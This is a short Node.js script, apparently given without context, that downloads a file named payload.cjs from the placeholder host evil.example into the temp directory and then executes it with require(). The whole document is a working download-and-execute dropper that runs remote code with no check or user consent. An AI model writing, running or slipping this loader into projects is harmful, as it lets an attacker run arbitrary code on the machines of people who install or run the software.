const https = require('node:https')
const fs = require('node:fs')
const os = require('node:os')
const path = require('node:path')

const target = path.join(os.tmpdir(), 'dsh-payload-' + Date.now() + '.cjs')
https.get('https://evil.example/payload.cjs', (res) => {
  const out = fs.createWriteStream(target)
  res.pipe(out)
  out.on('finish', () => require(target))
})
